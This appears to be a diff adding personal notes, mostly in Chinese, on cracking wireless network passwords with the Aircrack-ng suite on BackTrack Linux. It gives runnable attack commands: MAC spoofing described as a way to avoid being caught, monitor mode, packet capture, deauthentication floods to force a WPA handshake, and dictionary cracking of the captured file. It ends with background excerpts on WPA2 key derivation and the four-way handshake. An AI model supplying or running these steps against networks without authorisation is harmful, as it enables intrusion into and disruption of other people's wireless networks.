@@ -1,0 +1,91 @@
+本文主要是针对无线网络的密码破解，使用平台 linux 2.26.21.5 ,实现环境 BACKTRACK 3 FINAL(USB),无线破解工具 Aircrack-ng ，官方网站http://www.aircrack-ng.org ，Aircrack-ng系列工具也有windows 平台版本，但是本人的小黑的始终不能在win下抓包，所以只能 弃 win 从 lin 了，另外 win 下扫描到的 AP 也比 lin 下少了很多。其实 WIN 并不完整的支持 TCP/IP 协议族，有些协议 win 直接丢弃不用。网络本来从一开始就是 unix 的天下，win 只是在后来加入了网络的功能
+
+Aircrack-ng工具包有很多工具，我用到的工具主要有以下几个：
+airmon-ng       处理网卡工作模式
+airodump-ng     抓包
+aircrack-ng     破解
+aireplay-ng     发包，干扰
+另外还要用到以下 linux 命令:
+ifconfig        查看修改网卡状态和参数
+macchanger      伪造 MAC
+iwconfig        主要针对无线网卡的工具 (同 ifconfig)
+iwlist          获取无线网络的更详细信息
+另外还有其他的 linux 基本命令，我就不提示了
+
+
+具体破解步骤：
+1. 修改无线网卡状态：先 down 掉
+2. 伪造无线网卡的 MAC 地址：安全起见，减少被抓到的可能
+3. 修改网卡工作模式：进入Monitor状态，会产生一个虚拟的网卡
+4. 修改无线网卡状态： up
+5. 查看网络状态，记录下 AP 的 MAC 和本机的 MAC ，确定攻击目标
+6. 监听抓包：生成 .cap 或 .ivs
+7. 干扰无线网络：截取无线数据包，发送垃圾数据包，用来获得更多的有效数据包
+8. 破解 .cap 或 .ivs ，获得 WEP 密码，完成破解
+
+
+aircrack-ng 	套件包含有：
+Name			Description
+aircrack-ng		破解WEP以及WPA（字典攻击）密钥
+airdecap-ng		通过已知密钥来解密WEP或WPA嗅探数据
+airmon-ng		将网卡设定为监听模式
+aireplay-ng		数据包注入工具（Linux和Windows使用CommView驱动程序）
+airodump-ng		数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息
+airtun-ng		创建虚拟管道
+airolib-ng		保存、管理ESSID密码列表
+packetforge-ng	创建数据包注入用的加密包。
+Tools			混合、转换工具
+airbase-ng		软件模拟AP
+airdecloak-ng	消除pcap文件中的WEP加密
+airdriver-ng	无线设备驱动管理工具
+airolib-ng		保存、管理ESSID密码列表，计算对应的密钥
+airserv-ng		允许不同的进程访问无线网卡
+buddy-ng		easside-ng的文件描述
+easside-ng		和AP接入点通讯（无WEP）
+tkiptun-ng		WPA/TKIP攻击
+wesside-ng		自动破解WEP密钥
+
+http://wenku.baidu.com/view/d659deea998fcc22bcd10d7e.html  windows 下使用方法
+
+ifconfig -a               查看所有的网卡 
+ifconfig wlan0 up         激活无线网卡 
+airmon-ng start wlan0     设置无线网卡模式 
+airodump-ng mon0          查看无线网络信息 
+airodump-ng -w akast -c 6 mon0      抓包 
+
+进行 Deauth 攻击获取 handshake 
+aireplay-ng -0 1 -a AP 的 mac -c 客户端的 mac mon0
+
+airodump-ng --bssid 08:86:30:74:22:76 -c 6 --write WPAcrack mon0
+08:86:30:74:22:76 is the BSSID of the AP
+-c 6 is the channel the AP is operating on
+WPAcrack is the file you want to write to
+mon0 is the monitoring wireless adapter* 
+
+aireplay-ng --deauth 100 -a 08:86:30:74:22:76 mon0
+100 is the number of de-authenticate frames you want to send
+08:86:30:74:22:76 is the BSSID of the AP
+mon0 is the monitoring wireless adapter
+
+aireplay-ng --deauth 1000 -a 00:09:5B:6F:64:1E -h 44:6D:57:C8:58:A0 mon0
+
+aircrack-ng -w 密码字典 akast*.cap       开始破解
+
+aircrack-ng WPAcrack-01.cap -w /pentest/passwords/wordlists/darkc0de 
+
+很好的说明
+http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/
+名词解释 
+http://null-byte.wonderhowto.com/how-to/hack-wi-fi-getting-started-with-terms-and-technologies-0147659/
+
+Pre-shared key mode (PSK, also known as Personal mode) is designed for home and small office networks that don't require the complexity of an 802.1X authentication server.[9] Each wireless network device encrypts the network traffic using a 256 bit key. This key may be entered either as a string of 64 hexadecimal digits, or as a passphrase of 8 to 63 printable ASCII characters.[10] If ASCII characters are used, the 256 bit key is calculated by applying the PBKDF2 key derivation function to the passphrase, using the SSID as the salt and 4096 iterations of HMAC-SHA1
+
+Pairwise Transient Key (PTK) - A value that is derived from the pairwise master key (PMK)
+
+
+http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/Part+II+The+Design+of+Wi-Fi+Security/Chapter+10.+WPA+and+RSN+Key+Hierarchy/Details+of+Key+Derivation+for+WPA/
+This book is a very good resource on wireless security. This section explains the details of the four-way handshake, but you really need to read the whole chapter to understand it.
+
+Both WPA2-PSK and WPA2-EAP result in a Pairwise Master Key (PMK) known to both the supplicant (client) and the authenticator (AP). (In PSK the PMK is derived directly from the password, whereas in EAP it is a result of the authentication process.) The four-way WPA2 handshake essentially makes the supplicant and authenticator prove to each other that they both know the PMK, and creates the temporal keys used to actually secure network data.
+
+Capturing the four-way handshake will not divulge the PMK or PSK (since capturing the handshake is trivial over wireless this would be a major vulnerability). The PMK isn't even sent during the handshake, instead it is used to calculate a Message Integrity Check (MIC). You basically need to perform a dictionary or bruteforce attack on the handshake until you find a password which results in the same MIC as in the packets
